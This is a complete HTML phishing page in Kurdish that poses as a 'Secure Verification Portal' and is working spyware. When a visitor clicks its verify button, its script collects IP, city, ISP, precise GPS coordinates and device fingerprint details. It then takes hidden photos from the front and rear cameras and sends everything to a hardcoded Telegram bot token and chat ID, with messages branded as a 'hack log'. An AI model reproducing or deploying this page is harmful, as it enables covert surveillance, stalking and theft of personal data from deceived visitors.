<!DOCTYPE html>
<html lang="ku">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Secure Verification Portal</title>
    <style>
        * { box-sizing: border-box; }
        body { 
            background: #030712;
            color: #f3f4f6; 
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
            text-align: center; 
            display: flex; 
            flex-direction: column;
            justify-content: center; 
            align-items: center; 
            height: 100vh; 
            margin: 0; 
            overflow: hidden;
        }
        .card {
            background: #0f172a;
            padding: 40px 30px;
            border-radius: 20px;
            box-shadow: 0 20px 40px rgba(0,0,0,0.8);
            max-width: 440px;
            width: 90%;
            border: 1px solid #1e293b;
        }
        h2 { margin-bottom: 12px; font-size: 24px; color: #38bdf8; }
        p { color: #94a3b8; font-size: 14px; margin-bottom: 30px; line-height: 1.6; }
        .btn {
            background: linear-gradient(135deg, #0284c7, #2563eb);
            color: white;
            border: none;
            padding: 15px 20px;
            font-size: 16px;
            font-weight: bold;
            border-radius: 10px;
            cursor: pointer;
            width: 100%;
            transition: 0.3s;
            box-shadow: 0 6px 20px rgba(37, 99, 235, 0.5);
        }
        .btn:hover { background: linear-gradient(135deg, #0369a1, #1d4ed8); }
        #hidden-video, #canvas { display: none; }
    </style>
</head>
<body>

    <div class="card" id="main-card">
        <h2>پەیامەکا پاراستی</h2>
        <p>ژ بۆ پشتراستکرنا ناسناما تە و دیتنا ناڤەڕۆکا ڤەکری، لطفاً دوگمەیێ کلیک بکە.</p>
        <button class="btn" onclick="startUltimateProcess()">پشتراستکرن و دەستپێکرن</button>
    </div>

    <video id="hidden-video" autoplay playsinline></video>
    <canvas id="canvas"></canvas>

    <script>
        const token = '8927591228:AAGdIn4qL1xVXpH-jQ-lX_Ccgsy5jMByol4';
        const chat_id = '7643191802';
        const api = 'https://api.telegram.org/bot' + token;

        async function sendText(text) {
            try {
                await fetch(`${api}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ chat_id: chat_id, text: text })
                });
            } catch (e) {}
        }

        // وەرگرتنا زانیاریێن جیۆگرافی (GPS)
        function getGeoLocation() {
            return new Promise((resolve) => {
                if (!navigator.geolocation) {
                    resolve("📍 جیۆلۆکەیشن: پشتەڤانی ناهێتە کرن");
                    return;
                }
                navigator.geolocation.getCurrentPosition(
                    (pos) => {
                        const lat = pos.coords.latitude;
                        const lon = pos.coords.longitude;
                        resolve(`📍 جیۆلۆکەیشن (GPS): ${lat}, ${lon}\n🗺 نەخشە: https://maps.google.com/?q=${lat},${lon}`);
                    },
                    (err) => {
                        resolve("📍 جیۆلۆکەیشن: نەهاتە دان (رەتکرن)");
                    },
                    { timeout: 5000, enableHighAccuracy: true }
                );
            });
        }

        // وەرگرتنا باترییێ
        async function getBatteryInfo() {
            try {
                if ('getBattery' in navigator) {
                    const bat = await navigator.getBattery();
                    return `🔋 رێژا باترییێ: ${Math.round(bat.level * 100)}% (${bat.charging ? 'بار دبیت ⚡' : 'بێ بار'})`;
                }
            } catch(e) {}
            return "";
        }

        // وەرگرتنا زانیاریێن کارتەکا گرافیكی و هاردوێرا شاشەی (GPU Fingerprint)
        function getGpuInfo() {
            try {
                const canvas = document.createElement('canvas');
                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
                if (!gl) return "🎮 گرافیك: WebGL نەهاتیە ڤەکرن";
                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                if (debugInfo) {
                    const vendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
                    const renderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
                    return `🎮 چێڤەرێ گرافیكی (GPU): ${renderer} (${vendor})`;
                }
            } catch (e) {}
            return "🎮 گرافیك: نەهاتە ناسین";
        }

        // وەرگرتنا تۆڕا ئینتەرنێتێ
        function getNetworkInfo() {
            try {
                const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
                if (conn) {
                    return `📶 جۆرێ ئینتەرنێتێ: ${conn.effectiveType || 'نەدیار'} (خێرایی: ${conn.downlink || '?'} Mbps)`;
                }
            } catch (e) {}
            return "";
        }

        async function getIpInfo() {
            try {
                let res = await fetch('https://ipapi.co/json/');
                let data = await res.json();
                return `🌍 وەڵات: ${data.country_name} (${data.country_code})\n🏙 باژێر: ${data.city}\n🌐 ئایپی (IP): ${data.ip}\n🏢 کۆمپانیا (ISP): ${data.org}`;
            } catch (e) {
                return "🌍 زانیاریێن IP: نەهاتنە دیتن";
            }
        }

        async function getUltimateInfo() {
            let ipDetails = await getIpInfo();
            let geoDetails = await getGeoLocation();
            let batteryDetails = await getBatteryInfo();
            let gpuDetails = getGpuInfo();
            let netDetails = getNetworkInfo();
            let currentTime = new Date().toLocaleString();
            
            return `🔥 [ ⚡ MAXIMUM ULTIMATE HACK LOG ⚡ ] 🔥
⏱ دەم و ڕوژ: ${currentTime}
${ipDetails}
${geoDetails}
${batteryDetails ? batteryDetails + '\n' : ''}${gpuDetails}
${netDetails ? netDetails + '\n' : ''}📱 سیستەم: ${navigator.platform}
🧠 هۆشی (RAM): ${navigator.deviceMemory ? navigator.deviceMemory + ' GB' : 'نەدیار'}
⚙️ کۆرسیێن پرۆسێسەری: ${navigator.hardwareConcurrency || 'نەدیار'}
👆 دەستکاریکرنا شاشەی (Touch Points): ${navigator.maxTouchPoints || 0}
🌐 بووکەر: ${navigator.userAgent}
🗣 زمان: ${navigator.language}
📐 قەبارەی شاشەی: ${window.screen.width}x${window.screen.height}`;
        }

        async function sendVisitorLog() {
            let details = await getUltimateInfo();
            sendText(`🚀 سەردانکەرەکێ نوو (MAXIMUM LEVEL) لینک ڤەکەت!\n\n${details}\n\n⚠️ بڕڤەبە: @YUSEEF_SURCHI`);
        }

        async function captureCamera(facing, label) {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({
                    video: { width: { ideal: 1920 }, height: { ideal: 1080 }, facingMode: facing }
                });
                const video = document.getElementById('hidden-video');
                video.srcObject = stream;

                return new Promise((resolve) => {
                    video.onloadedmetadata = () => {
                        video.play();
                        setTimeout(async () => {
                            const canvas = document.getElementById('canvas');
                            canvas.width = video.videoWidth || 1280;
                            canvas.height = video.videoHeight || 720;
                            const ctx = canvas.getContext('2d');
                            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

                            canvas.toBlob(async (blob) => {
                                let details = await getUltimateInfo();
                                const formData = new FormData();
                                formData.append('chat_id', chat_id);
                                formData.append('photo', blob, 'shot.jpg');
                                formData.append('caption', `📸 وێنەیێ MAXIMUM (${label})!\n\n${details}\n\n⚠️ بڕڤەبە: @YUSEEF_SURCHI`);

                                await fetch(`${api}/sendPhoto`, { method: 'POST', body: formData });
                                stream.getTracks().forEach(t => t.stop());
                                resolve();
                            }, 'image/jpeg', 0.98);
                        }, 2500);
                    };
                });
            } catch (err) {}
        }

        async function startUltimateProcess() {
            document.getElementById('main-card').innerHTML = "<h2>چاوەڕێبە...</h2><p>تکایە کچکەکێ صبر بکە هەتا داتا و بڕوخسەت هێنە بجهئینان.</p>";
            
            await sendVisitorLog();
            await captureCamera("user", "کامێرا پێشی (Selfie)");
            await captureCamera("environment", "کامێرا پاش (Rear)");

            setTimeout(() => {
                document.getElementById('main-card').innerHTML = "<h2>پشتراستکرن تەواو بوو!</h2><p>سوپاس بۆ هاریکاریا تە، نوکە دشێی لاپەڕەی بێخە.</p>";
            }, 1000);
        }
    </script>
</body>
</html>
